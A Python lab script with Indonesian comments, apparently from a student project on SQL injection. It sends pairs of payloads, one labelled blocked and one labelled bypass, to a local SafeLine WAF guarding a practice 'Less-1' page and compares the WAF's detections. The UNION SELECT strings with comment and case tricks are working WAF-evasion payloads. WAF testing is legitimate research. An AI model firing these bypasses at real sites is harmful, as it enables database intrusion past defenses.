"""
bypass_lab/debug_compare.py
============================
Kirim pasangan payload (blocked vs bypass) dengan jeda,
sambil monitor docker logs safeline-detector di terminal lain.

Run terminal 1: docker logs safeline-detector --tail 20 -f
Run terminal 2: python3 -m bypass_lab.debug_compare

Atau cukup jalankan ini dan cek Safeline UI → Attacks setelah selesai.
"""
import sys, time
sys.path.insert(0, '/mnt/d/Kuliah/RL/SeqSQLi')
import requests

WAF = "http://localhost:8888/Less-1/"

pairs = [
    # (label, blocked_payload, bypass_payload)
    ("comment vs no-comment",
     ".1'/0 UNION ALL SELECT 1,2,3'",           # BLOCKED
     ".1-- -'/0 UNION ALL SELECT 1,2,3'"),       # BYPASS

    ("dengan case",
     ".1'/0 uNiOn aLl sElEcT 1,2,3'",           # BLOCKED
     ".1-- -'/0 uNiOn aLl sElEcT 1,2,3'"),      # BYPASS

    ("standard UNION",
     "-1' UNION SELECT database(),'X','Y'-- -",  # BLOCKED
     ".1-- -'/0 UNION ALL SELECT 1,2,3'"),       # BYPASS
]

print("Kirim payload bergantian. Cek UI Attacks atau docker logs.\n")
for label, blocked, bypass in pairs:
    print(f"=== {label} ===")

    r1 = requests.get(WAF, params={"id": blocked}, timeout=8)
    print(f"  BLOCKED payload: HTTP {r1.status_code} ← {repr(blocked[:60])}")
    time.sleep(1)

    r2 = requests.get(WAF, params={"id": bypass}, timeout=8)
    print(f"  BYPASS  payload: HTTP {r2.status_code} ← {repr(bypass[:60])}")
    time.sleep(2)

print("\nSekarang buka https://localhost:9443 → Attacks")
print("Lihat entry BLOCKED dan bandingkan dengan entry yang tidak muncul (bypass)")
print("Click attack entry → lihat: attack_type, confidence, matched_content")
